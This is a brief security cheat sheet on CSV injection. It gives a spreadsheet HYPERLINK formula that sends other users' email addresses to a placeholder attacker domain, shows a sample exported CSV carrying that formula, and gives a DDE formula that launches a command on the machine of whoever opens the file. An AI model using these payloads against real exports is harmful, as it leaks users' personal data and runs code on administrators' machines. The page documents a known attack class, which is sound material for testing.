# CSV Injection

## Table of Contents

- [Data Exfiltration](#data-exfiltration)
- [Command Execution on the Victim's Machine](#command-execution-on-the-victims-machine)

## Data Exfiltration

### Other cells in an exported spreadsheet, often containing other users' data, can be sent to the attacker when the file is opened. [^1]

- Leaking adjacent cells through a link
    1. Value the attacker submits, such as their display name
        ```text
        =HYPERLINK("https://[ATTACKER-DOMAIN]/?d="&B2&","&B3,"View profile")
        ```

    2. File exported by the service
        ```csv
        name,email
        Alice,[USER-EMAIL-1]
        Bob,[USER-EMAIL-2]
        "=HYPERLINK(""https://[ATTACKER-DOMAIN]/?d=""&B2&"",""&B3,""View profile"")",attacker@[ATTACKER-DOMAIN]
        ```
    The cell is shown as a "View profile" link. When the administrator who opened the export clicks it, the email addresses in `B2` and `B3` are sent to the attacker.

## Command Execution on the Victim's Machine

### Commands can run on the computer of the person who opens the exported file, typically an administrator or support agent. [^2]

- Launching a command through Dynamic Data Exchange
    ```text
    =cmd|' /C calc'!A0
    ```
    - OWASP, [CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

[^1]: Applies when the exported value is not escaped and the spreadsheet application treats it as a formula, which happens when it starts with `=`, `+`, `-`, or `@`.
[^2]: Applies to spreadsheet applications that still run Dynamic Data Exchange (DDE) formulas. Recent versions of Microsoft Excel disable DDE server launch by default or show security warnings before running it.
